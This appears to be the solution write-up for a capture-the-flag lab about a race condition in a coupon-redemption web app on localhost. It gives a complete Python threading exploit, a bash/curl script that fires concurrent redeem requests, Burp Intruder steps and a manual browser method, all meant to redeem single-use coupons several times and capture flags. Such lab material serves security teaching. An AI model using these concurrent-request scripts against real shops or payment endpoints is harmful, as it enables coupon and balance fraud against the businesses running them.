## Solution

### Method 1: Python Threading (Recommended)

Create a Python script to send concurrent requests:

```python
#!/usr/bin/env python3
import urllib.request
import urllib.parse
import json
import threading
import http.cookiejar

TARGET = "http://localhost:4011"

# Create cookie jar to maintain session
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
urllib.request.install_opener(opener)

def redeem_coupon(code, thread_num):
    """Redeem a coupon"""
    try:
        data = json.dumps({"code": code}).encode('utf-8')
        req = urllib.request.Request(
            f"{TARGET}/redeem",
            data=data,
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            result = json.loads(response.read().decode())
            print(f"[Thread {thread_num}] {result.get('message', result)}")
            return result
    except Exception as e:
        print(f"[Thread {thread_num}] Error: {e}")
        return None

def exploit_race_condition(coupon_code, num_requests=10):
    """Exploit race condition by sending concurrent requests"""
    print(f"\n[*] Exploiting {coupon_code} with {num_requests} concurrent requests...")

    # Create threads
    threads = []
    for i in range(num_requests):
        t = threading.Thread(target=redeem_coupon, args=(coupon_code, i))
        threads.append(t)

    # Start all threads at once
    for t in threads:
        t.start()

    # Wait for all to complete
    for t in threads:
        t.join()

def check_balance():
    """Check current balance and flags"""
    req = urllib.request.Request(f"{TARGET}/balance")
    with urllib.request.urlopen(req) as response:
        data = json.loads(response.read().decode())
        print(f"\n[+] Current Balance: ${data['balance']}")
        if data.get('flags'):
            print("\n🎉 FLAGS CAPTURED:")
            for flag_data in data['flags']:
                print(f"   {flag_data['flag']}")
                print(f"   {flag_data['message']}\n")
        return data['balance']

def main():
    print("="*60)
    print("Race Condition Exploit")
    print("="*60)

    # First, visit the page to establish session
    urllib.request.urlopen(f"{TARGET}/").read()

    # FLAG 1: Exploit WELCOME100 ($100 coupon)
    # Need $200+, so redeem it 3+ times
    exploit_race_condition("WELCOME100", num_requests=5)
    balance = check_balance()

    if balance < 500:
        # FLAG 2: Exploit SPECIAL200 ($200 coupon)
        exploit_race_condition("SPECIAL200", num_requests=5)
        check_balance()

    if balance < 1000:
        # FLAG 3: Exploit PREMIUM500 ($500 coupon)
        exploit_race_condition("PREMIUM500", num_requests=3)
        check_balance()

    print("="*60)
    print("Exploitation Complete!")
    print("="*60)

if __name__ == '__main__':
    main()
```

### Method 2: Bash with curl

```bash
#!/bin/bash
TARGET="http://localhost:4011"

# Establish session and get cookie
COOKIE=$(curl -s -c - "$TARGET/" | grep session | awk '{print $7}')

# Function to redeem coupon
redeem() {
    curl -s -X POST "$TARGET/redeem" \
        -H "Content-Type: application/json" \
        -H "Cookie: session=$COOKIE" \
        -d "{\"code\": \"$1\"}" &
}

# Exploit WELCOME100 with 10 concurrent requests
echo "[*] Exploiting WELCOME100..."
for i in {1..10}; do
    redeem "WELCOME100"
done
wait

# Check balance
curl -s "$TARGET/balance" -H "Cookie: session=$COOKIE" | python3 -m json.tool

# Exploit PREMIUM500
echo "[*] Exploiting PREMIUM500..."
for i in {1..5}; do
    redeem "PREMIUM500"
done
wait

curl -s "$TARGET/balance" -H "Cookie: session=$COOKIE" | python3 -m json.tool
```

### Method 3: Burp Suite Repeater

1. Capture a valid redemption request in Burp Proxy
2. Send to Repeater
3. Right-click → Send to Intruder
4. Set attack type to "Sniper" or "Pitchfork"
5. Set thread count to 10-20
6. Start attack - all requests sent concurrently
7. Check balance to see if race condition succeeded

### Method 4: Browser (Manual)

1. Open multiple browser tabs/windows (10+)
2. Load the challenge in each tab
3. In each tab, click the same coupon's "Redeem" button
4. Try to click all buttons as simultaneously as possible
5. Check if balance increased more than the coupon value

### Expected Results

- **1-2 concurrent requests**: Usually detected, one fails
- **3-5 concurrent requests**: High success rate for race condition
- **10+ concurrent requests**: Almost guaranteed to exploit the race